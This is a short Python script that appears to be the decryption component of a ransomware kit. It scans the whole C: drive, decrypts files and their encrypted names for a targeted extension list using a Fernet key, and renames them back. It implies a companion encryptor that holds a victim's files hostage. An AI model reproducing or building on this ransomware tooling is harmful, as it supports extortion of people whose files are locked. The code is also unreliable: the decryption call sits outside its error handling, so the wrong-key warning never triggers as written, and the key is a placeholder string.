from Extensions import get_extensions
from cryptography.fernet import Fernet
from os import walk
from os import path
from os import rename
from win32ui import *
from win32con import *

# Getting key
key = "Insert your decryption key here: "
f = Fernet(key)

# Extensions
extensions = get_extensions()

# Scanning entire C drive
for root, dirs, files in walk("C:\\"):
    # Grabbing files
    for file in files:
        fpath  = root + "\\" + file
        ext = path.splitext(root + "\\" + file)[1]

        # Decrypting only files with specific extension
        if ext in extensions:
            with open(fpath, "rb") as of:
                encrypted: bytes = of.read()

            decrypted = f.decrypt(encrypted)

            # Check key
            try:
                with open(fpath, "wb") as of:
                    of.write(decrypted)

                # Decrypting filename
                filename = f.decrypt(file.encode())
                newpath: str = root + "\\" + filename.decode()
                rename(fpath, newpath)
            except:
                MessageBox(
                    "The inserted key is wrong.",
                    MB_ICONWARNING
                )
                break